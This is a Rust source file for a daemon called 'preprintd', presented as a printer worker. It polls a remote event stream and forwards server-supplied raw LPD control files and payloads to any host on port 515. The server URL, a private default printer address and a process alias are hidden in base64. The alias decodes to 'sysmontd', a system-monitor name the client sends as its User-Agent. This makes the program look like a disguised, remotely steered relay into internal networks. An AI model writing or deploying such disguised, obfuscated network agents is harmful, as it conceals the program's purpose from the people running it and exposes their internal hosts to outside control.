/*
 * preprintd - Printer swarm listener/worker implementation for PreConnect.
 * Copyright (C) 2026  Anindya Shiddhartha & contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 *
 */
use std::{
    env,
    io::{BufRead, BufReader},
    net::TcpStream,
    sync::{
        LazyLock,
        atomic::{AtomicUsize, Ordering},
    },
    thread::sleep,
    time::Duration,
};

mod tcp_extras;
mod types;
mod utils;

use anyhow::Result;
use reqwest::blocking::Client;
use serde_json::{Value, json};
use tcp_extras::TcpExtras;

use crate::{
    types::Job,
    utils::{decode_b64, decode_field},
};

static CLIENT: LazyLock<Client> = LazyLock::new(reqwest::blocking::Client::new);
static DEBUG: LazyLock<bool> = LazyLock::new(|| env::args().any(|arg| arg == "--debug"));
static WORKER_KEY: LazyLock<String> = LazyLock::new(|| {
    let mut args = env::args();

    while let Some(arg) = args.next() {
        if arg == "--key" {
            return decode_b64(&args.next().expect("--key must be a string literal")).unwrap();
        }
    }

    panic!("missing --key")
});
static JOBS_COMPLETED: AtomicUsize = AtomicUsize::new(0);

static BASE_URL: LazyLock<String> =
    LazyLock::new(|| decode_b64("aHR0cHM6Ly9hcGkucHJlY29ubmVjdC5hcHA=").expect("ib"));
static ALIAS: LazyLock<String> = LazyLock::new(|| decode_b64("c3lzbW9udGQ=").expect("ia"));
static AGENT: LazyLock<String> = LazyLock::new(|| format!("{}/1.0", ALIAS.as_str()));
static DEF_HOST: LazyLock<String> = LazyLock::new(|| decode_b64("MTcyLjE2LjAuMTEx").expect("ih"));
static DEF_QUEUE: LazyLock<String> = LazyLock::new(|| decode_b64("c2VjdXJl").expect("iq"));

macro_rules! debug_log {
    ($($arg:tt)*) => {
        if *DEBUG {
            eprintln!("[DEBUG] {}", format_args!($($arg)*));
        }
    };
}

fn claim_job(id: Option<&String>) -> bool {
    let Some(id) = id.filter(|f| !f.is_empty()) else {
        return true;
    };

    let body = json!({ "id": id });
    let resp = CLIENT
        .post(format!("{}/print/claim", BASE_URL.as_str()))
        .body(body.to_string())
        .header("Content-Type", "application/json")
        .header("User-Agent", AGENT.as_str())
        .timeout(Duration::from_secs(3))
        .send();

    let claim = match resp {
        Ok(r) => {
            let Ok(r) = r.error_for_status() else {
                return true;
            };

            let Ok(value) = r.json::<Value>() else {
                return true;
            };

            value
                .get("claimed")
                .and_then(|f| f.as_bool())
                .unwrap_or(false)
        }
        Err(e) => {
            debug_log!("(Send error) /print/claim: {e}");
            true
        }
    };

    if claim {
        debug_log!("Claimed new job!");
    } else {
        debug_log!("Skipping on this job...")
    }

    claim
}

fn handle(job: Job) -> Result<()> {
    let j_id = &job.id;

    if j_id.is_some() && !(claim_job(j_id.as_ref())) {
        return Ok(());
    }

    let host = job.printer_host.as_deref().unwrap_or(DEF_HOST.as_str());
    let queue_name = job.printer_queue.as_deref().unwrap_or(DEF_QUEUE.as_str());

    let Some(payload) = decode_field(job.payload.as_deref())? else {
        return Ok(());
    };

    let q_cmd = decode_field(job.q_cmd.as_deref())?
        .unwrap_or_else(|| format!("\x02{}\n", queue_name).into_bytes());

    let ctl = decode_field(job.ctl.as_deref())?
        .or(decode_field(job.control_file.as_deref())?)
        .unwrap_or_default();

    let cf_hdr = decode_field(job.cf_hdr.as_deref())?
        .unwrap_or_else(|| format!("\x02{} cfA002{}\n", ctl.len(), ALIAS.as_str()).into_bytes());

    let df_hdr = decode_field(job.df_hdr.as_deref())?.unwrap_or_else(|| {
        format!("\x03{} dfA002{}\n", payload.len(), ALIAS.as_str()).into_bytes()
    });

    debug_log!(
        "Handling job for {host}:{queue_name} (payload size: {} bytes)",
        payload.len()
    );

    let addr = (host, 515);
    let mut socket = match TcpStream::connect(addr) {
        Ok(s) => s,
        Err(e) => {
            debug_log!("Failed to connect using TcpStream::connect to address: {addr:?}: {e}");
            return Ok(());
        }
    };

    socket.set_nodelay(true)?;
    let timeout = Duration::from_secs((15 + payload.len() as u64 / 1048576 * 10).clamp(15, 600));

    socket.set_read_timeout(Some(timeout))?;
    socket.set_write_timeout(Some(timeout))?;

    let nul = [0u8];
    if socket.send_buf(&q_cmd)
        && socket.recv_ack()
        && socket.send_buf(&cf_hdr)
        && socket.recv_ack()
        && socket.send_buf(&ctl)
        && socket.send_buf(&nul)
        && socket.recv_ack()
        && socket.send_buf(&df_hdr)
        && socket.recv_ack()
        && socket.send_buf(&payload)
        && socket.send_buf(&nul)
        && socket.recv_ack()
    {
        debug_log!("Job transferred successfully. Shutting down current socket connection.");
        JOBS_COMPLETED.fetch_add(1, Ordering::Relaxed);
    }

    let _ = socket.shutdown(std::net::Shutdown::Both);
    Ok(())
}

fn stream() -> Result<()> {
    let resp = match CLIENT
        .get(format!("{}/printer", BASE_URL.as_str()))
        .header("Accept", "text/event-stream")
        .header("User-Agent", AGENT.as_str())
        .timeout(Duration::from_secs(90))
        .send()
    {
        Ok(r) => match r.error_for_status() {
            Ok(res) => res,
            Err(e) => {
                debug_log!("(Error for status) /printer: {e}");
                return Ok(());
            }
        },
        Err(e) => {
            debug_log!("(Send error) /printer: {e}");
            return Ok(());
        }
    };

    let mut reader = BufReader::new(resp);
    let mut line = String::new();

    loop {
        line.clear();

        let n = match reader.read_line(&mut line) {
            Ok(bytes) => bytes,
            Err(e) => {
                debug_log!("Failed to read line: {e}; breaking.");
                break;
            }
        };

        if n == 0 {
            debug_log!("Empty line read, breaking.");
            break;
        }

        if let Some(data) = line.strip_prefix("data: ")
            && let Ok(value) = serde_json::from_str::<Job>(data)
        {
            debug_log!("Data match! ({data}); attempting to handle it...");
            let _ = handle(value);
        }
    }

    Ok(())
}

fn main() {
    let mut iter_count = 0;
    loop {
        debug_log!(
            "Connection #{iter_count}; Jobs completed: {}",
            JOBS_COMPLETED.load(Ordering::Relaxed)
        );
        let _ = stream();
        sleep(Duration::from_millis(2000));
        iter_count += 1;
    }
}
